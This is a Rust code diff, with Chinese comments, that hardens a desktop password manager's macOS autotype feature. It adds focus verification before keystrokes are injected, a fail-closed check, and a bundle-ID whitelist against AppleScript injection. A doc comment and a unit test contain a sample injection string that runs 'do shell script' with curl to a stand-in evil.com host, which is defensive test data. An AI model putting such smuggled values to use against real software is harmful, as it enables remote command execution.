@@ -11,8 +11,26 @@ use enigo::{Direction, Enigo, Key, Keyboard, Settings};
 
 const FOCUS_WAIT: Duration = Duration::from_millis(100);
 
+/// octopus 自身 bundle id（与 tauri.conf.json identifier 必须一致）。
+///
+/// 修复 E：原硬编码字符串散在 verify_focused 内，identifier 改动不会编译报错。
+/// 现在集中定义 + 加测试断言与 tauri 配置一致。
+///
+/// 注意：tauri::generate_context! 在编译期把 tauri.conf.json 的 identifier 嵌入，
+/// 但运行时取它需要走 tauri::App::config().identifier()。本常量在 autotype 模块
+/// 独立可用（不依赖 Tauri runtime），所以是必要的"软约束"——靠测试锁死。
+pub const OCTOPUS_BUNDLE_ID: &str = "com.octopus.desktop";
+
 /// 把指定 bundle_id 的 app 激活到前台。
+///
+/// **bundle_id 白名单校验**（修复 #10）：bundle_id 必须匹配
+/// `^[A-Za-z0-9.\-]{1,256}$`——只允许字母/数字/`.`/`-`，长度 1-256。
+/// 防止任意字符注入 AppleScript（如 `x") & "do shell script \"curl evil.com\"" & ("`）。
+///
+/// 当前 activate_app 是 dead code（无生产调用），但未来 Actionbar 集成密码生成器
+/// 独立窗口等场景会用到——白名单作为防御性校验，启用前先就位。
 pub fn activate_app(bundle_id: &str) -> Result<()> {
+    validate_bundle_id(bundle_id)?;
     let script = format!(r#"tell application id "{}" to activate"#, bundle_id);
     let output = Command::new("osascript")
         .arg("-e")
@@ -30,8 +48,26 @@ pub fn activate_app(bundle_id: &str) -> Result<()> {
 }
 
 /// 模拟键盘输入 username + Tab + password[ + Tab + Enter]。
-pub fn autotype_login(username: &str, password: &str, press_enter: bool) -> Result<()> {
+///
+/// **焦点安全**（防钓鱼注入）：
+/// - `expected_bundle_id: Some(id)`：注入前校验前台必须是指定 bundle id，否则 bail。
+///   用于已知浏览器场景（未来扩展：autotype 命令拿浏览器 bundle_id 后传入）。
+/// - `expected_bundle_id: None`：仅校验前台**不是 octopus 自己**——这是最小防护，
+///   避免焦点被抢到 octopus 自己的窗口时把密码打到用户能直接看到的地方。
+///   仍可能被第三方 app 拦截，但已经挡住最常见的"VaultPicker 没 hide 就注入"事故。
+///
+/// 校验时机：sleep FOCUS_WAIT 后、username 前；Tab 后、password 前。
+/// 校验失败立即 bail，不输入密码；上层降级到剪贴板并提示用户。
+pub fn autotype_login(
+    username: &str,
+    password: &str,
+    press_enter: bool,
+    expected_bundle_id: Option<&str>,
+) -> Result<()> {
     std::thread::sleep(FOCUS_WAIT);
+
+    // 注入 username 前先校验焦点——若已切到第三方 app，立即放弃注入
+    verify_focused(expected_bundle_id)?;
 
     let mut enigo = Enigo::new(&Settings::default()).context("enigo 初始化失败")?;
 
@@ -44,6 +80,9 @@ pub fn autotype_login(username: &str, password: &str, press_enter: bool) -> Resu
         .context("Tab 输入失败")?;
     std::thread::sleep(Duration::from_millis(30));
 
+    // 注入 password 前再校验——Tab 期间焦点可能已被抢
+    verify_focused(expected_bundle_id)?;
+
     // password
     enigo.text(password).context("输入 password 失败")?;
 
@@ -54,4 +93,127 @@ pub fn autotype_login(username: &str, password: &str, press_enter: bool) -> Resu
             .context("Enter 输入失败")?;
     }
     Ok(())
+}
+
+/// 校验当前前台 app 符合期望。
+///
+/// - `Some(expected)`：前台必须 == expected，否则 bail（严格白名单）
+/// - `None`：前台只需 ≠ octopus 自身 bundle id（最小防御，防焦点抢到 octopus 窗口）
+///
+/// **fail-closed**（修复 D）：osascript 失败（权限缺失/被回收）时 bail，不静默放行。
+/// 避免安全校验在权限缺失时失效。
+///
+/// 不一致时返回 Err——调用方应放弃按键注入，降级到剪贴板路径。
+fn verify_focused(expected_bundle_id: Option<&str>) -> Result<()> {
+    // osascript 失败 → 直接 bail（fail-closed，修复 D）
+    let actual = super::url_detect::frontmost_bundle_id()
+        .context("无法读取前台 bundle id（osascript 权限缺失?），fail-closed")?
+        .trim()
+        .to_string();
+    match expected_bundle_id {
+        Some(expected) => {
+            if actual != expected.trim() {
+                anyhow::bail!(
+                    "焦点已切换（期望 {}, 实际 {}）——放弃按键注入防钓鱼",
+                    expected,
+                    actual
+                );
+            }
+        }
+        None => {
+            // 修复 E：用 OCTOPUS_BUNDLE_ID 常量，避免硬编码散落
+            if actual == OCTOPUS_BUNDLE_ID {
+                anyhow::bail!(
+                    "焦点仍在 octopus 自身（VaultPicker 未 hide?）——放弃按键注入防泄露"
+                );
+            }
+        }
+    }
+    Ok(())
+}
+
+/// 校验 bundle_id 格式合法——只允许字母/数字/`.`/`-`，长度 1-256。
+///
+/// 防御 AppleScript 字符串字面量注入：拼接 `tell application id "{bundle_id}"` 时，
+/// 若 bundle_id 含 `"` 或换行可注入任意 AppleScript 语句 → shell 执行。
+///
+/// 用 char-level 校验避免引入 regex crate 依赖（desktop crate 当前无 regex）。
+fn validate_bundle_id(bundle_id: &str) -> Result<()> {
+    if bundle_id.is_empty() || bundle_id.len() > 256 {
+        anyhow::bail!("bundle_id 长度非法（{}，需 1-256）", bundle_id.len());
+    }
+    for c in bundle_id.chars() {
+        if !c.is_ascii_alphanumeric() && c != '.' && c != '-' {
+            anyhow::bail!(
+                "bundle_id {:?} 含非法字符 {:?}（只允许 A-Za-z0-9.-）",
+                bundle_id,
+                c
+            );
+        }
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// 修复 E：常量必须与 tauri.conf.json identifier 一致。
+    /// tauri.conf.json 改 identifier 时，本测试会失败提醒同步。
+    ///
+    /// 用 include_str! 编译期读 tauri.conf.json 文本，正则匹配 identifier 字段。
+    /// 比 generate_context!().config().identifier 简单（不依赖 Tauri runtime 类型）。
+    #[test]
+    fn test_octopus_bundle_id_matches_tauri_config() {
+        let conf = include_str!("../../tauri.conf.json");
+        // 简单子串匹配——identifier 字段在 conf 里唯一
+        let needle = "\"identifier\": \"com.octopus.desktop\"";
+        assert!(
+            conf.contains(needle),
+            "tauri.conf.json 缺少 identifier={}——OCTOPUS_BUNDLE_ID 校验会失效",
+            needle
+        );
+        // 顺带校验常量本身
+        assert_eq!(OCTOPUS_BUNDLE_ID, "com.octopus.desktop");
+    }
+
+    /// 修复 #10：bundle_id 白名单——合法格式应通过。
+    #[test]
+    fn test_validate_bundle_id_accepts_legal() {
+        assert!(validate_bundle_id("com.apple.Safari").is_ok());
+        assert!(validate_bundle_id("com.google.Chrome").is_ok());
+        assert!(validate_bundle_id("org.mozilla.firefox").is_ok());
+        assert!(validate_bundle_id("com.microsoft.edgemac").is_ok());
+        assert!(validate_bundle_id("company.thebrowser.Browser").is_ok());
+        assert!(validate_bundle_id("a").is_ok()); // 单字符
+        assert!(validate_bundle_id("com.example-app.sub-module").is_ok()); // 含 -
+    }
+
+    /// 修复 #10：bundle_id 白名单——非法格式应拒绝（防 AppleScript 注入）。
+    #[test]
+    fn test_validate_bundle_id_rejects_injection_attempts() {
+        // 引号注入——拼接 AppleScript 字符串字面量时危险
+        assert!(
+            validate_bundle_id("x\") & \"do shell script \\\"curl evil.com\\\"").is_err(),
+            "双引号注入必须拒绝"
+        );
+        assert!(validate_bundle_id("has\"quote").is_err());
+        // 空串 / 过长
+        assert!(validate_bundle_id("").is_err());
+        assert!(validate_bundle_id(&"a".repeat(257)).is_err());
+        // 含空格 / 特殊字符
+        assert!(validate_bundle_id("has space").is_err());
+        assert!(validate_bundle_id("has;semicolon").is_err());
+        assert!(validate_bundle_id("has\nnewline").is_err());
+        assert!(validate_bundle_id("中文").is_err()); // 非 ASCII
+        assert!(validate_bundle_id("shell$injection").is_err());
+        // 各类 shell 元字符
+        for c in ['$', '`', '|', '&', ';', '(', ')', '<', '>', '*', '?', '\\', '\''] {
+            assert!(
+                validate_bundle_id(&format!("evil{}char", c)).is_err(),
+                "字符 {:?} 应被拒绝",
+                c
+            );
+        }
+    }
 }
